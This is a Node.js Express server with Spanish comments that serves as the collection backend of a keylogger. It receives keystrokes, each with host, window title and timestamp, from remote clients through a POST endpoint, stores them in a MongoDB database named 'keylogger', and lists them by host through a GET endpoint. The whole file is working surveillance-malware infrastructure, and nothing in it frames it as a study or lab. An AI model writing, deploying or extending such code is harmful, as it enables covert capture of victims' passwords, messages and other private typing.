const express = require('express');
const mongoose = require('mongoose');
const path = require('path');

const Keystroke = require('./models/Keystroke');

const PORT = parseInt(process.env.PORT || '3000', 10);
const MONGO_URI = process.env.MONGO_URI || 'mongodb://127.0.0.1:27017/keylogger';

const app = express();
app.use(express.json({ limit: '32kb' }));

// Recepcion de pulsaciones desde el cliente.
app.post('/api/keystroke', async (req, res) => {
  const { host, window, key, timestamp } = req.body || {};
  if (typeof key !== 'string') {
    return res.status(400).json({ error: 'key requerido' });
  }
  const doc = await Keystroke.create({
    host: host || 'unknown',
    window: window || '',
    key,
    timestamp: timestamp ? new Date(timestamp) : new Date()
  });
  res.status(201).json({ id: doc._id });
});

// Listado de pulsaciones con filtros simples.
app.get('/api/keystrokes', async (req, res) => {
  const { host, limit } = req.query;
  const q = {};
  if (host) q.host = host;
  const docs = await Keystroke.find(q)
    .sort({ timestamp: -1 })
    .limit(Math.min(parseInt(limit || '200', 10), 1000));
  res.json(docs);
});

// Salud.
app.get('/api/health', (req, res) => res.json({ ok: true }));

async function main() {
  await mongoose.connect(MONGO_URI);
  console.log('MongoDB conectado:', MONGO_URI);
  app.listen(PORT, () => console.log(`Servidor escuchando en http://127.0.0.1:${PORT}`));
}

main().catch(err => {
  console.error('Fallo al iniciar:', err);
  process.exit(1);
});
